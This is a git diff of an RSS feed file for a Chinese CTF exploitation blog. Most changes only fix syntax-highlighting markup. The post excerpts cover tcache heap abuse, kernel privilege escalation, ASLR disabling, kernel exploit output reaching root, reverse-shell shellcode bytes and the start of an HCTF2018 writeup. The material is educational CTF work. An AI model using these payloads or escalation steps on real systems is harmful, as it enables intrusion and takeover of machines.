@@ -71,9 +71,7 @@
       
       <guid>https://bash-c.github.io/post/dive-into-tcache/</guid>
       
-        <description>&lt;p&gt;&lt;/p&gt;
-
-&lt;p&gt;tcache 是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术（see &lt;a href=&#34;https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc&#34;&gt;commit&lt;/a&gt;），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。&lt;/p&gt;
+        <description>&lt;p&gt;tcache 是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术（see &lt;a href=&#34;https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc&#34;&gt;commit&lt;/a&gt;），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。&lt;/p&gt;
 
 &lt;blockquote&gt;
 &lt;p&gt;主要参考了 glibc 源码，angelboy 的 slide 以及 tukan.farm，链接都放在最后了。&lt;/p&gt;
@@ -1990,9 +1988,7 @@ We got the control&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
       
       <guid>https://bash-c.github.io/post/hwb2018-pwn-writeup/</guid>
       
-        <description>&lt;p&gt;&lt;/p&gt;
-
-&lt;p&gt;跟学校的队伍参加了又一次 &lt;code&gt;?网杯&lt;/code&gt;，记录一下 pwn 的 writeup。&lt;/p&gt;
+        <description>&lt;p&gt;跟学校的队伍参加了又一次 &lt;code&gt;?网杯&lt;/code&gt;，记录一下 pwn 的 writeup。&lt;/p&gt;
 
 &lt;h2 id=&#34;gettingstart&#34;&gt;gettingstart&lt;/h2&gt;
 
@@ -2396,7 +2392,7 @@ We got the control&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;最后贴一下我的 exp，写了注释&lt;/p&gt;
@@ -2641,9 +2637,7 @@ We got the control&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
       
       <guid>https://bash-c.github.io/post/linux-kernel-pwn-abc-2/</guid>
       
-        <description>&lt;p&gt;&lt;/p&gt;
-
-&lt;p&gt;这一篇讲 ret2usr 攻击和 smep 保护。主要参考了 &lt;a href=&#34;https://github.com/bash-c/slides/blob/master/pwn_kernel/smep_bypass.pdf&#34;&gt;Pratical SMEP bypass techniques on Linux&lt;/a&gt;。&lt;/p&gt;
+        <description>&lt;p&gt;这一篇讲 ret2usr 攻击和 smep 保护。主要参考了 &lt;a href=&#34;https://github.com/bash-c/slides/blob/master/pwn_kernel/smep_bypass.pdf&#34;&gt;Pratical SMEP bypass techniques on Linux&lt;/a&gt;。&lt;/p&gt;
 
 &lt;h2 id=&#34;ret2usr&#34;&gt;ret2usr&lt;/h2&gt;
 
@@ -3447,9 +3441,7 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
       
       <guid>https://bash-c.github.io/post/linux-kernel-pwn-abc-1/</guid>
       
-        <description>&lt;p&gt;&lt;/p&gt;
-
-&lt;p&gt;记录一下最近学到的 linux kernel pwn 知识，第一篇主要是一些基础知识和简单漏洞利用，比较基础。&lt;/p&gt;
+        <description>&lt;p&gt;记录一下最近学到的 linux kernel pwn 知识，第一篇主要是一些基础知识和简单漏洞利用，比较基础。&lt;/p&gt;
 
 &lt;h2 id=&#34;basic-knowledge&#34;&gt;Basic Knowledge&lt;/h2&gt;
 
@@ -3882,8 +3874,8 @@ rootfs.cpio
 CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ls
 babydriver.tar  boot.sh  bzImage  rootfs.cpio
 CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; file bzImage
-bzImage: Linux kernel x86 boot executable bzImage, version &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.4.72 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;atum@ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; file rootfs.cpio
+bzImage: Linux kernel x86 boot executable bzImage, version &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.4.72 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;atum@ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA&lt;/span&gt;
+CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; file rootfs.cpio
 rootfs.cpio: gzip compressed data, last modified: Tue Jul  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;:39:15 &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt;, max compression, from Unix, original size &lt;span class=&#34;m&#34;&gt;2844672&lt;/span&gt;
 CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; file boot.sh
 boot.sh: Bourne-Again shell script, ASCII text executable
@@ -4518,8 +4510,8 @@ exploit
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;.377201&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; alloc &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;.377629&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; device release
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; root now.
-/ &lt;span class=&#34;c1&#34;&gt;# id
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ctf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/ &lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ctf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 / #&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
@@ -5145,8 +5137,8 @@ with the text.  SECT is a section name to be loaded at SECT_ADDR.&lt;/code&gt;&l
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# setsid /bin/cttyhack setuidgid 1000 /bin/sh
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;setsid /bin/cttyhack setuidgid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# setsid /bin/cttyhack setuidgid 1000 /bin/sh&lt;/span&gt;
+setsid /bin/cttyhack setuidgid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;重新打包，这样启动的时候就是 root 权限了。&lt;/p&gt;
@@ -5318,8 +5310,8 @@ with the text.  SECT is a section name to be loaded at SECT_ADDR.&lt;/code&gt;&l
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;// qemu 内
-/ &lt;span class=&#34;c1&#34;&gt;# cat /sys/module/core/sections/.text 
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;0xffffffffc018b000
+/ &lt;span class=&#34;c1&#34;&gt;# cat /sys/module/core/sections/.text&lt;/span&gt; 
+0xffffffffc018b000
 ......
 ......
 
@@ -5332,10 +5324,10 @@ pwndbg&amp;gt; add-symbol-file ./core.ko 0xffffffffc018b000
 add symbol table from file &lt;span class=&#34;s2&#34;&gt;&amp;#34;./core.ko&amp;#34;&lt;/span&gt; at
 	.text_addr &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0xffffffffc018b000
 Reading symbols from ./core.ko...&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;...done.
-pwndbg&amp;gt; b core_read					&lt;span class=&#34;c1&#34;&gt;# 加载了符号表，就可以直接对函数下断点了
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0xffffffffc018b063
-pwndbg&amp;gt; b *&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xffffffffc018b000+0xCC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# 或者根据基地址直接下断点
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0xffffffffc018b0cc
+pwndbg&amp;gt; b core_read					&lt;span class=&#34;c1&#34;&gt;# 加载了符号表，就可以直接对函数下断点了&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0xffffffffc018b063
+pwndbg&amp;gt; b *&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xffffffffc018b000+0xCC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# 或者根据基地址直接下断点&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0xffffffffc018b0cc
 pwndbg&amp;gt; target remote localhost:1234
 Remote debugging using localhost:1234
 ERROR: Could not find ELF base!
@@ -5407,8 +5399,8 @@ Continuing.
 
 
 // qemu 内
-/ &lt;span class=&#34;c1&#34;&gt;# /tmp/exploit
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;status has been saved.
+/ &lt;span class=&#34;c1&#34;&gt;# /tmp/exploit&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;status has been saved.
 commit_creds addr: 0xffffffffa169c8e0
 vmlinux_base addr: 0xffffffffa1600000
 prepare_kernel_cred addr: 0xffffffffa169cce0
@@ -5924,8 +5916,8 @@ prepare_kernel_cred addr: 0xffffffffbd09cce0
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; to buf.
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;canary: 0x6be486f377bb8600
 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;copy from user with size: -65280
-/ &lt;span class=&#34;c1&#34;&gt;# id
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+/ &lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;当然这个题目也有其他做法，下篇再分析。&lt;/p&gt;
@@ -6130,10 +6122,10 @@ data.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get update
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get install libpcap-dev
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# dpkg -l libpcap-dev
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get update&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# apt-get install libpcap-dev&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# dpkg -l libpcap-dev&lt;/span&gt;
+
 root@7fe409e06b06:~# dpkg -l libpcap-dev
 &lt;span class=&#34;nv&#34;&gt;Desired&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Unknown/Install/Remove/Purge/Hold
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;Status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
@@ -6152,10 +6144,10 @@ ii  libpcap-dev    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;.7.4-2      all  
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get install wget gcc make vim python gdb git sudo
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# wget https://github.com/the-tcpdump-group/tcpdump/archive/tcpdump-4.9.0.tar.gz
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# tar xzf ./tcpdump-4.9.0.tar.gz 
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;# ./configure&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get install wget gcc make vim python gdb git sudo&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# wget https://github.com/the-tcpdump-group/tcpdump/archive/tcpdump-4.9.0.tar.gz&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# tar xzf ./tcpdump-4.9.0.tar.gz&lt;/span&gt; 
+&lt;span class=&#34;c1&#34;&gt;# ./configure&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;执行 &lt;code&gt;configure&lt;/code&gt; 会生成 &lt;code&gt;Makefile&lt;/code&gt;。
@@ -6178,8 +6170,8 @@ ii  libpcap-dev    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;.7.4-2      all  
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make&lt;/span&gt;
+
 root@7fe409e06b06:~/tcpdump-tcpdump-4.9.0# ./tcpdump --version
 tcpdump version &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.9.0
 libpcap version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;.7.4&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
@@ -9243,7 +9235,7 @@ Final size of python file: &lt;span class=&#34;m&#34;&gt;896&lt;/span&gt; bytes
 &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&amp;#34;&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\x01\x01&amp;#34;&lt;/span&gt;
 
-# 腾讯云的学生主机没什么东西，大佬们就不要搞了&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;c1&#34;&gt;# 腾讯云的学生主机没什么东西，大佬们就不要搞了&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;然后就可以在 vps 上拿到 shell 了&lt;/p&gt;
@@ -10249,6 +10241,53 @@ lsof    &lt;span class=&#34;m&#34;&gt;10598&lt;/span&gt;  m4x    2u   CHR  &lt;s
 &lt;li&gt;给这个 socket 分配 ip 和 port&lt;/li&gt;
 &lt;li&gt;通过 dup2，将 socket 的 fd 复制到 0，1 和 2 上，这样 shell 的 io 就完全通过建立的 socket 了，这时如果我们监听这个 ip 和 port，就相当于拿到了一个 shell&lt;/li&gt;
 &lt;/ol&gt;
+
+&lt;h2 id=&#34;level-4-hctf2018-the-end&#34;&gt;level 4: HCTF2018 - the_end&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://veritas501.space&#34;&gt;veritas501师傅&lt;/a&gt; 出的题目，很独特，关闭了 stdout 和 stderr，但保留了 stdin。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;__noreturn&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+4h] [rbp-Ch]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+8h] [rbp-8h]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;here is a gift %p, good luck ;)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_bss_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
